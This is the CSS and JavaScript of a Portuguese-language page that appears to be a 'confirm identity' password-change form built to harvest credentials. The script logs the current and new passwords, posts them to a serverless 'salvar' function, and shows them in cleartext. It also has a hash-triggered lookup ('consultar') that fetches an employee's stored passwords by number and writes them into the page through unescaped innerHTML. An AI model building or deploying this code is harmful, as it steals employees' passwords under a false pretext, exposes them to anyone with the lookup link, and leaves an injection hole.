.card{width:100%;max-width:625px;background:rgb(181,179,216);border:1px solid #cfcdea;padding:40px 59px 41px;text-align:center}
.card .logo{width:265px;max-width:100%;height:auto;margin:0 auto 34px;display:block}
.field{position:relative;margin-bottom:16px}
.field svg.ico{position:absolute;left:15px;top:50%;transform:translateY(-50%);width:18px;height:18px;stroke:#2b2a4c;fill:none;stroke-width:1.5}
.field input{width:100%;height:40px;border:1px solid #e3e2f0;background:#fff;color:#2b2a4c;padding:0 44px 0 39px;font-family:var(--serif);font-size:18px;border-radius:3px}
.field input::placeholder{color:#a3a1b8;opacity:1}
.eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:0;cursor:pointer;padding:4px;display:flex;color:#2b2a4c}
.eye svg{width:20px;height:20px;stroke:currentColor;fill:none;stroke-width:1.5}
.btn{width:100%;height:40px;margin-top:30px;border:0;border-radius:3px;background:var(--brand);color:#fff;font-family:var(--serif);font-size:18px;cursor:pointer;box-shadow:0 1px 3px rgba(30,20,120,.25);transition:background .15s}
.btn:hover{background:var(--brand-dark)}
.msg{margin:0;font-size:15px;color:#3b1d8f;min-height:0}
.msg:not(:empty){margin-top:12px}
.ok{width:72px;height:72px;border-radius:50%;background:#7debc4;margin:0 auto 20px;display:flex;align-items:center;justify-content:center}
.ok svg{width:36px;height:36px;stroke:#2b2a4c;fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round}
#done h1{font-size:26px;font-weight:700;color:#2b2a4c;margin:0 0 12px;line-height:1.2}
#done p{font-size:18px;line-height:1.5;color:#2b2a4c;margin:0}
.page{display:none}
.page.active{display:block}
.data-list{list-style:none;margin:0 0 28px;padding:0;text-align:left}
.data-list li{display:flex;justify-content:space-between;gap:16px;padding:11px 0;border-bottom:1px solid #cfcdea;font-size:17px;color:#2b2a4c}
.data-list li:last-child{border-bottom:0}
.data-list span:first-child{color:#55536f}
.data-list span:last-child{font-weight:700;letter-spacing:.04em}
@media (max-width:760px){
 header{height:72px;padding-right:16px;padding-left:16px}
 nav{gap:18px}nav a,nav button{font-size:15px}
 main{padding-top:48px;background-size:auto 100%}
 .card{padding:28px 22px 30px}
}
@media (max-width:520px){nav a.api{display:none}}
</style>

let L="pt";
function setLang(l){L=l;const t=T[l];document.documentElement.lang=l;
 $("#t-sub").textContent=t.sub;$("#t-api").textContent=t.api;$("#langLabel").textContent=t.n;

 document.querySelectorAll(".eye").forEach(b=>{const i=$("#"+b.dataset.target);b.setAttribute("aria-label",i.type==="text"?t.show:t.hide)});}
const lang=$("#lang"),lb=lang.querySelector("button");
lb.addEventListener("click",()=>{const o=lang.classList.toggle("open");lb.setAttribute("aria-expanded",o)});
lang.querySelectorAll("li button").forEach(b=>b.addEventListener("click",()=>{setLang(b.dataset.l);lang.classList.remove("open");lb.setAttribute("aria-expanded","false")}));
document.addEventListener("click",e=>{if(!lang.contains(e.target))lang.classList.remove("open")});
document.querySelectorAll(".eye").forEach(b=>b.addEventListener("click",()=>{const i=$("#"+b.dataset.target),s=i.type==="text";i.type = s ? "password" : "text";b.querySelector(".slash").style.display=s?"none":"";b.setAttribute("aria-label",T[L][s?"hide":"show"])}));
const VIEWS=["confirmidentity","dados"];
function mask(v){return v.length?"•".repeat(v.length):"—"}

function renderData(){
  const t=T[L],list=$("#dataList");
  const rows=[
    ["Senha Atual",   $("#p0").value || "—"],
    ["Senha Nova",  $("#p1").value || "—"],
    ["Senha Nova", $("#p2").value || "—"]
  ];
  list.innerHTML="";
  rows.forEach(([k,v])=>{
    const li=document.createElement("li");
    const a=document.createElement("span");a.textContent=k;
    const b=document.createElement("span");b.textContent=v;
    li.append(a,b);list.appendChild(li);
  });
}

function showView(name){
  const v=VIEWS.includes(name)?name:"confirmidentity";
  document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
  $("#view-"+v).classList.add("active");
  if(v==="dados"){renderData();$("#back").focus()}
}
async function enviarDados(p0, p1, p2) {
  console.log("Enviando para o servidor:", { p0, p1, p2 });

  const resposta = await fetch('/.netlify/functions/salvar', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'   // <-- ISSO FAZ O SERVIDOR ENTENDER OS DADOS
    },
    body: JSON.stringify({ p0, p1, p2 })
  });

  if (!resposta.ok) {
    alert('Erro ao salvar: ' + await resposta.text());
    return false;
  }
  const resultado = await resposta.json();
  alert(resultado.mensagem);
  return true;
}

async function consultarFuncionario(p0){
  const alvo=$("#resultadoConsulta");
  alvo.textContent="Buscando...";

  const resposta=await fetch('/.netlify/functions/consultar?p0='+encodeURIComponent(p0));

  if(!resposta.ok){
    alvo.innerHTML="<p>Funcionário não encontrado.</p>";
    return;
  }

  const dados=await resposta.json();
  alvo.innerHTML=
    "<p><strong>Número:</strong> "+p0+"</p>"+
    "<p><strong>p1:</strong> "+dados.p1+"</p>"+
    "<p><strong>p2:</strong> "+dados.p2+"</p>";
}

async function go(){
  const p1=$("#p0").value;
  const p2=$("#p1").value;
  const p0=$("#p2").value;
  const t=T[L];
  let m="";

  if(!p1||!p2||!p0) m=t.e1;

  $("#msg").textContent=m;
  if(m) return;

  const ok=await enviarDados(p0,p1,p2);
  if(!ok) return;

  location.hash="dados";
}

$("#login").addEventListener("click",go);

document.querySelectorAll("form input").forEach(i=>i.addEventListener("keydown",e=>{
  if(e.key==="Enter"){ e.preventDefault(); go(); }
}));

$("#back").addEventListener("click",()=>{
  ["p0","p1","p2"].forEach(i=>{
    const e=$("#"+i);
    e.value="";
    e.type="text";
  });
  document.querySelectorAll(".slash").forEach(s=>s.style.display="");
  $("#msg").textContent="";
  location.hash="confirmidentity";
});

function tratarHash(){
  const h=location.hash.slice(1);
  if(h.startsWith("cd")){
    document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
    $("#view-consulta").classList.add("active");
    consultarFuncionario(h.replace("cd",""));
  }else{
    showView(h);
  }
}

window.addEventListener("hashchange",tratarHash);
setLang("pt");
tratarHash();
</script>
